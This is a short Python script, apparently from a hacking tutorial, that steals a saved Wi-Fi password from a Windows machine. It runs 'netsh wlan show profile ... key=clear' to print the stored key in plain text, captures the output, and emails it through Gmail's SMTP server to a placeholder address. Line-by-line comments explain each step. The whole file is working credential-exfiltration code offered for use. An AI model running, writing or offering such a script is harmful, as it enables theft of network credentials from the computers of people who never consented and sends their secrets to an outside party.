#!/usr/bin/env python
import subprocess  # Import the subprocess module for running external commands
import smtplib  # Import the smtplib library for sending emails

# Function to send an email with a given message
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server connection
    server.starttls()  # Start TLS encryption for secure communication
    server.login(email, password)  # Log in to the email account
    server.sendmail(email, email, message)  # Send the email with the specified message
    server.quit()  # Quit the SMTP server

command = "netsh wlan show profile WiFi key=clear"  # Define the command to retrieve Wi-Fi network profiles
result = subprocess.check_output(command, shell=True)  # Run the command and capture its output
send_mail("your@mail.com", "password", result)  # Send the captured output via email
